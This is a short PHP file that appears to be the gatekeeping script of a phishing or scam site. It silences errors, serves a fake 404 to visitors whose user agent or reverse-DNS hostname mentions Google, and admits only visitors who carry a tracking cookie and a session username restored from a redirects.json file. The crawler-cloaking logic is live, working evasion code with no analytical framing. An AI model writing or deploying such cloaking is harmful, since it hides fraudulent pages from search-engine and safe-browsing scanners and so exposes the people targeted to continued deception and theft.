<?php
error_reporting(0);
require_once('session_init.php');

include('session/function.php');
include('config.php');


use JayBizzle\CrawlerDetect\CrawlerDetect;
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { include($path."404.php"); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { include($path."404.php"); exit(); }

// Restore username from redirects.json FIRST (before any checks)
restore_username_from_redirects();

// Generate random ID for redirects
$random_id = bin2hex(random_bytes(16));

// Check if visitor key exists in cookie
if (!isset($_COOKIE['visitor_key'])) {
    header("Location: index.php?" . $random_id);
    exit();
}

// Check if session username exists and has a value
if (!isset($_SESSION['username']) || empty($_SESSION['username'])) {
    header("Location: index.php?id=" . $random_id);
    exit();
}

